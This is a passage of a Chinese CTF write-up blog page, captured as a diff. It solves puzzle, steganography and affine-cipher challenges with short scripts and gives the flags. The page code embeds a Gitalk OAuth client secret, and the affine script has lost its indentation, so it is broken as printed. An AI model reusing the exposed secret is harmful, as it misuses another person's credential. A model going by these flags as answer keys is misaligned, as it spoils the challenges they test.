+</code></pre><p><strong>flag：flag{f6c5acfd4192b4152661d19b411d2d63}</strong></p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="Numeric-Password"><a href="#Numeric-Password" class="headerlink" title="Numeric Password"></a>Numeric Password</h4><p>题目描述：</p>
+<p>中华文化博大精深，近日在教小外甥学习1-110之间的数字，可是小外甥比较调皮，不好好学，于是灵机一动，</p>
+<p>想到一个容易记忆，并且还可以识字的好办法，你知道我想出了什么办法吗？下边是在教外甥学习的一部分内容，你知道分别代表什么意思吗？</p>
+<p>(企鹅，青蛙，油漆，花旗参，救生圈，油漆，二胡，二石，漏斗，二石，二石，冰淇淋，漏斗，喇叭，油漆，冰淇淋，鹅卵石，21世纪，耳机，</p>
+<p>油漆，耳机，二石，二胡，耳机，21世纪，企鹅，二流子，二石，要发，二石，冰淇淋，冰淇淋，油漆，冰淇淋，企鹅，乔丹，二石，酒壶）</p>
+<p><strong>信息收集</strong></p>
+<p>由题目的描述 Numeric Password并且是110位，百度一波成功得到一份数字密码表</p>
+<p><img src="https://i.imgur.com/yPyPRJx.png" alt=""></p>
+<p><strong>题目分析</strong></p>
+<p>对照上面的表格就可以得到相对应的数字</p>
+<pre><code>      72,78,67,73,93,67,25,20,69,20,20,70,69,
+      68,67,70,24,21,27,67,27,20,25,27,21,72,
+      26,20,18,20,70,70,67,70,72,23,20,95
+</code></pre><p><strong>脚本分析</strong></p>
+<p>使用python脚本对这些数字做一个凯撒的偏移就可以得到flag：</p>
+<pre><code>content =[72,78,67,73,93,67,25,20,69,20,20,70,69,
+  68,67,70,24,21,27,67,27,20,25,27,21,72,
+  26,20,18,20,70,70,67,70,72,23,20,95]
+flag = &quot;&quot;
+for i in range(20,33):
+    for j in content:
+        flag +=chr(j+i)
+    print (flag)
+    flag =&quot;&quot;
+</code></pre><p>最后得到flag:<code>flag{a72c22dcbad639a92793f8202ddadf52}</code></p>
+<h4 id="我的公子在何方"><a href="#我的公子在何方" class="headerlink" title="我的公子在何方"></a>我的公子在何方</h4><p>给出一个压缩包里面含有一个txt文件，一个flie文件需要密码，</p>
+<p>txt文件有解压密码：<code>MXIydzNlYQ</code></p>
+<p><strong>题目分析</strong></p>
+<p>直接输入给出的解码密码显示错误，想到是base64解码：<code>1r2w3ea</code></p>
+<p>成功得到一个图片以及一个txt文档，txt文件给出的信息是：</p>
+<p>小明得到一张图片，只知道其载体图像是24位的BMP格式图像，并且密码是与图片主人公演绎的剧中相关的人物，你能帮他还原信息吗？</p>
+<p><strong>信息收集</strong></p>
+<p>首先：百度：<strong>载体图像是24位的BMP格式图像隐写工具</strong></p>
+<p>就会得到工具：</p>
+<p><img src="https://i.imgur.com/vKCsRqZ.png" alt=""></p>
+<p>其次：百度一波这个照片上面的人物的名字：</p>
+<p><img src="https://i.imgur.com/IWBRTVY.png" alt=""></p>
+<p>在天仙配按照题目描述，与其相关的人物就是董永(dongyong）</p>
+<p><strong>题目解析</strong></p>
+<p>由以上得到的信息就可以对题目进行解答</p>
+<p><img src="https://i.imgur.com/zCthhL8.png" alt=""></p>
+<p>很明显有一个字符串：<code>U2FsdGVkX1+E3U0NYWvetAhb3vNfUXToWw0T0ntODmd3I1QiUuAG+6OVOPIDYf/DaCY+XtEX</code></p>
+<p>使用在线解码工具：<a href="http://tool.oschina.net/encrypt" target="_blank" rel="noopener">http://tool.oschina.net/encrypt</a></p>
+<p>经过多次的尝试就会得到答案：</p>
+<p><img src="https://i.imgur.com/gfH8vgM.png" alt=""></p>
+<p>flag:<code>flag{97db6057a9a113c3e0a2bfb188a92698}</code></p>
+<h4 id="大吉大利今晚吃鸡"><a href="#大吉大利今晚吃鸡" class="headerlink" title="大吉大利今晚吃鸡"></a>大吉大利今晚吃鸡</h4><p>题目描述：一个avi格式的视频</p>
+<p><strong>题目分析</strong></p>
+<p>使用一个视频隐写工具就可以了：<a href="http://deegger-embedder.findmysoft.com/" target="_blank" rel="noopener">DeEgger Embedder</a></p>
+<p>得到一个乱码的TXT文档，查看一下文件头发现PNG格式进行更改格式就会得到</p>
+<p><img src="https://i.imgur.com/QdbVkZW.png" alt=""></p>
+<p>使用<a href="https://zxing.org/w/decode.jspx" target="_blank" rel="noopener">ZXing Decoder Online</a>在线解码工具就会得到</p>
+<p><img src="https://i.imgur.com/hAxjKBC.png" alt=""></p>
+<p>看起来很像是flag然而提交上去不正确</p>
+<p>使用脚本进行处理，此时需要一个新的库bubblepy，安装很简单pip install bubblepy即可</p>
+<p><img src="https://i.imgur.com/cqOVLNz.png" alt=""></p>
+<p>对刚刚的字符进行解码的时候需要注意首尾都需要更改为x就会得到flag的一半，至于另一半需要看图片里面的信息</p>
+<p><img src="https://i.imgur.com/FCjDxtS.png" alt=""></p>
+<p>使用在线工具解码之后就会得到</p>
+<p><img src="https://i.imgur.com/IeX58IT.png" alt=""></p>
+<p>加上刚刚的那一部分合起来即为所需要的flag</p>
+<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="仿射"><a href="#仿射" class="headerlink" title="仿射"></a>仿射</h4><p>题目描述：密文：achjbnpdfherebjsw b=7</p>
+<p><strong>信息收集</strong></p>
+<p>百度一下了解关于仿射加密的信息：<a href="https://blog.csdn.net/qq_41725312/article/details/81067248" target="_blank" rel="noopener">https://blog.csdn.net/qq_41725312/article/details/81067248</a></p>
+<p><strong>题目分析</strong></p>
+<p>拿到题目，提示b=7，以及一串密码</p>
+<pre><code>achjbnpdfherebjsw
+</code></pre><p>我们知道仿射密码为</p>
+<p><img src="https://i.imgur.com/tkVxy8U.jpg" alt=""></p>
+<p>a的逆元取值范围在<code>(1,9,21,15,3,19,7,23,11,5,17,25)</code></p>
+<p>所以直接解密即可</p>
+<p><img src="https://i.imgur.com/vF2q0Bh.jpg" alt=""></p>
+<p>代码如下：</p>
+<pre><code>import gmpy2
+string = &#39;achjbnpdfherebjsw&#39;
+b=7
+for i in (1,9,21,15,3,19,7,23,11,5,17,25):
+flag = &#39;&#39;
+for k in string:
+flag += chr(i*((ord(k)-ord(&#39;a&#39;))-b)%26+ord(&#39;a&#39;))
+print flag
+</code></pre><p><img src="https://i.imgur.com/6S20k5X.png" alt=""></p>
+
+					
+				</div>
+			</div>
+		</article>
+
+		<ul class="am-pagination">
+    
+    	<li class="am-pagination-prev">
+   		<a class="pull-left" href="/2019/03/21/部分中间件漏洞总结(不定时更新)/" title="部分中间件漏洞总结(不定时更新)">
+      		&laquo; 上一篇
+		</a>
+		</li>
+	
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2019/03/21/安恒杯十二月月赛/" title="安恒杯十二月月赛">
+			下一篇 &raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
+</div>
+
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
+
+	
+		
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+
+  <div id="gitalk-container"></div>
+
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//create gitalk
+	var gitalk = new Gitalk({
+		clientID: '74a83cc9b15a1cf53e10',
+		clientSecret: 'b62af8b132c33178adcb0098e2315806e2e57cae',
+		//id: window.location.pathname,
+		// id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: md5(location.href.trimEnd('#.*$,\\?.*$,index.html$')),
+		repo: 'Annie-Gitalk',
+		owner: 'miraitowa',
+		admin: 'miraitowa',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+		
+	
+
+</div>
+
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
+
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-text">前言</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web"><span class="post-toc-text">web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#签到题——-手速要快"><span class="post-toc-text">签到题—— 手速要快</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#image-up"><span class="post-toc-text">image_up</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#好黑的黑名单"><span class="post-toc-text">好黑的黑名单</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#interesting-web"><span class="post-toc-text">interesting web</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ezsql"><span class="post-toc-text">ezsql</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Write-A-Shell"><span class="post-toc-text">Write A Shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#MISC"><span class="post-toc-text">MISC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Numeric-Password"><span class="post-toc-text">Numeric Password</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#我的公子在何方"><span class="post-toc-text">我的公子在何方</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#大吉大利今晚吃鸡"><span class="post-toc-text">大吉大利今晚吃鸡</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#CRYPTO"><span class="post-toc-text">CRYPTO</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#仿射"><span class="post-toc-text">仿射</span></a></li></ol></li></ol></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</div></div></aside>
+	
+
+	</div>
+</div>
+		</div>
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="blog-text-center">
+		<div class="theme-annie-social">
+				
+				
+					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
+				
+				
+					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+					
+						
+				
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			
+				&copy; 2018 11 11 - 2019, content by miraitowa. All Rights Reserved.			       	
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
+
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 100px 25% 0;
+		width: 50%;
+		line-height: 1.4;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
+		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+
+
+
+
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
+
+	</body>
+	</html>
+
